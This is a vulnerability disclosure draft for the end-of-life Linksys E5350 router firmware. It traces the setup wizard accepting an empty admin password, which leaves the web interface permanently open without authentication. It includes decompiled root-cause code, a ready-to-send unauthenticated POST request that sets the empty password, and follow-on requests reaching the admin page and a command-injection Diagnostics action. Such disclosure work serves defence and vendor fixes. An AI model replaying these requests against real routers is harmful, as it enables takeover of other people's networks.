# CVE-TBD: Linksys E5350 Empty Admin Password Accepted by Setup Wizard Leading to Permanent Authentication Bypass

## Affected Product

- Vendor: Linksys
- Product: E5350
- Firmware: v1.0.00.037 (latest and last release; the product is end-of-life)
- Component: `httpd` (CyberTAN-derived embedded web server), setup-wizard `save_settings` handler and authentication core

## Summary

An improper-authentication vulnerability was discovered in Linksys E5350
firmware v1.0.00.037. The setup wizard's `save_settings` handler accepts an
**empty router administrator password** without any validation — and the
handler itself is reachable without authentication in factory state. Once
the wizard completes, the httpd authentication core treats
`wizard_finish=="1" && close_session=="1" && http_passwd==""` as an
unconditional pass: **the entire management interface — including the
command-injection-capable Diagnostics action — becomes permanently usable
without credentials**, while the owner sees a normally completed setup and
a working network.

## Vulnerability Type / CWE

- CWE-258: Empty Password in Configuration File
- CWE-306: Missing Authentication for Critical Function

## Root Cause

- `setup_wizard/save_settings` handler (`httpd` 0x406c14):

```c
pcVar6 = get_cgi("wizard_router_pwd");       // may be ""
...
nvram_set_value("http_passwd", pcVar6);      // empty password persisted, no check
```

  This endpoint is reachable pre-auth in factory state via
  `/wizard/apply.cgi` (see companion filing
  01-wizard-preauth-command-injection).
- httpd authentication core (~0x427xxx, httpd.c:14829–14841): when
  `wizard_finish=="1"` and `close_session=="1"` and the stored
  `http_passwd` is empty, the request is passed with auth result = success
  (LAB_00428044), bypassing the credential check for **every** protected
  endpoint.
- `close_wizard.cgi` sets `close_session=1` from the `Close_Session` CGI
  parameter, also reachable pre-auth during factory state.

## Proof of Concept (non-destructive)

Stage 1 — factory state (`wizard_finish=0`), no credentials:

```
POST /wizard/apply.cgi HTTP/1.1
Host: <ROUTER_IP>
Content-Type: application/x-www-form-urlencoded

submit_button=setup_wizard&submit_type=save_settings&change_action=gozila_cgi&wizard_wl0_ssid=TestNet24&wizard_wl1_ssid=TestNet5&wizard_wl0_wpa_psk=passphrase1&wizard_wl1_wpa_psk=passphrase2&wizard_router_pwd=&time_zone=PST8
```

Observed: `HTTP 200`; NVRAM store log shows `SET http_passwd=` — the empty
password is persisted with no rejection.

Stage 2 — wizard completion (on hardware this is exactly the state after
the wizard finishes with an empty password): `wizard_finish=1`,
`close_session=1`, `http_passwd=""`.

Stage 3 — post-setup state, still **no credentials**:

- `GET /index.asp` → `HTTP 200`, 42,454 bytes, `<TITLE>Router Status</TITLE>`
  — the full admin page. (With a non-empty password the same request yields
  the 4,408-byte login page.)
- `POST /apply.cgi` with the Diagnostics `start_ping` command-injection
  payload → `HTTP 200`; NVRAM log shows `SET ping_ip=<payload>` —
  unauthenticated OS command injection is now live (see companion filings
  01 and 03).

Controls (matching the static logic exactly — all three conditions are
necessary):

- `wizard_finish=1`, `http_passwd=""`, `close_session` unset → login page
  (4,408 bytes): no bypass.
- `wizard_finish=1`, `http_passwd="admin"` → login page: no bypass.

## Impact

An attacker present during the factory/setup window can silently convert
the router to **permanent unauthenticated remote control**: the owner
observes a normally completed setup and a working network while every
administrative endpoint — including OS command injection as root — remains
open to anyone on the network. Independently of any attacker, a legitimate
user who leaves the wizard password field blank ends up running a silently
unauthenticated router indefinitely.

## Non-duplication

No existing CVE covers an empty-password acceptance or wizard-state
authentication weakness in Linksys E5350/E5400/E5450. The only E5350 CVE
on record is CVE-2022-35572 (pre-auth information disclosure in
SysInfo.htm, an unrelated read-only leak). Related wizard/pre-auth issues
in other models (e.g. CVE-2024-57536, E8450 `wizard_status`) involve
different parameters and mechanisms on different products.

## Proposed CVSS 3.1

`AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` — **8.8 (High)**

## Discovery

- Date: 2026-10-11
- Method: static reverse engineering (Ghidra) + dynamic verification on
  rehosted firmware (QEMU user-mode) with runtime PoC evidence and control
  experiments
- Researcher: Zimo-666

## Timeline

- 2026-10-11: Vulnerability discovered and verified
- TBD: Vendor notification
- TBD: CVE ID assignment
- TBD: Public disclosure
